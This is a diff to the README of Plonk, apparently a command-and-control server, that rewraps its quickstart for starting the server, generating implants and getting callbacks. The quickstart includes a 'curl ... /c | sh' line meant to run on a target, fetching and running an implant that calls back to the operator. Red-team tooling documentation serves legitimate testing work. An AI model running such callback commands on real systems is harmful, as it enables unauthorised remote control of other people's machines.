@@ -10,7 +10,8 @@ up and use but also powerful enough for real, if simple, ops.
    3. [Exfil Upload](./doc/protocol.md#exfil-p)
    4. [Implant Generation](./doc/protocol.md#implant-generation-c)
    5. [Static File Serving](./doc/protocol.md#static-files-f)
-2. Fairly simple [setup](#singleplayer-quickstart) and [configuration](./doc/config.md)
+2. Fairly simple [setup](#singleplayer-quickstart) and
+   [configuration](./doc/config.md)
 3. Multiplayer-friendly, with reasonably simple
    [setup](./doc/multiplayer.md)
 4. [TLS](./doc/tls.md) by default, with [Let's Encrypt](https://letsencrypt.org)
@@ -19,10 +20,14 @@ up and use but also powerful enough for real, if simple, ops.
 
 Singleplayer Quickstart
 -----------------------
+Make sure you have [Go](https://go.dev/doc/install) installed.
+
 ```sh
 # Install Plonk itself.  This can be done on another host, so long as plonk
 # is in PATH on the server or the rest of this section is adjusted accordingly.
 go install github.com/magisterquis/plonk@v0.0.1-beta.1
+# Did it work?
+plonk -v
 
 # Start it going
 nohup plonk -server -https 0.0.0.0:4433 >/dev/null 2>&1 &
@@ -35,17 +40,27 @@ ls "$HOME/plonk.d/"                 # Populated directory exists?
 #     files  log.json  op.sock  state.json
 tail "$HOME/plonk.d/log.json"       # Log looks ok?  tail -f is also neat.
 # Log will tell you everything's happy:
-#    {"time":"2023-12-29T22:45:27.206057004Z","level":"INFO","msg":"Server ready","dirname":"/home/h4x/plonk.d"}
+#     {"time":"2023-12-29T22:45:27.206057004Z","level":"INFO",
+#     "msg":"Server ready","dirname":"/home/h4x/plonk.d"}
 curl -svk https://127.0.0.1:4433/c  # Implant generation works?
-# Should see a shell script with a couple of curl -k -pinnedpubkey "sha256//..." lines
+# Should see a shell script with a couple of
+#     curl -k -pinnedpubkey "sha256//..."
+# lines, calling back to 127.0.0.1.
 
 # Get a callback
-curl -sk https://<plonk>:4433/c | sh  # On target and with a better URL, of course.  
-                                      # Don't use -k if Plonk was started with -letsencrypt
+curl -sk https://<plonk>:4433/c | sh  # On target and with a better URL,
+                                      # of course.  
+                                      # Don't use -k if Plonk was started with
+                                      # -letsencrypt
 tail -n2 "$HOME/plonk.d/log.json"     # Get the callback?  May need more -n.
 # Log should say an implant was generated and something called back, like:
-#    {"time":"2023-12-29T22:52:02.235811943Z","level":"INFO","msg":"Implant generation","parameters":{"PubkeyFP":"1oOI5fF7U7bLSVythHfk0COUNvymV0aoWfTT1puBfIk=","RandN":"57i","URL":"https://[REDACTED]:4433"},"sni":"","host":"[REDACTED]:4433","method":"GET","remote_address":"[REDACTED]:32260","url":"/c"}
-#    {"time":"2023-12-29T22:52:02.280309985Z","level":"INFO","msg":"New implant","id":"57i-target.my.domain-9924"}
+#    {"time":"2023-12-29T22:52:02.235811943Z","level":"INFO",
+#     "msg":"Implant generation","parameters":{
+      "PubkeyFP":"1oOI5fF7U7bLSVythHfk0COUNvymV0aoWfTT1puBfIk=","RandN":"57i",
+#     "URL":"https://[REDACTED]:4433"},"sni":"","host":"[REDACTED]:4433",
+#     "method":"GET","remote_address":"[REDACTED]:32260","url":"/c"}
+#    {"time":"2023-12-29T22:52:02.280309985Z","level":"INFO",
+#     "msg":"New implant","id":"57i-target.my.domain-9924"}
 
 # Interact with the target
 plonk  # Connect to the server as an operator
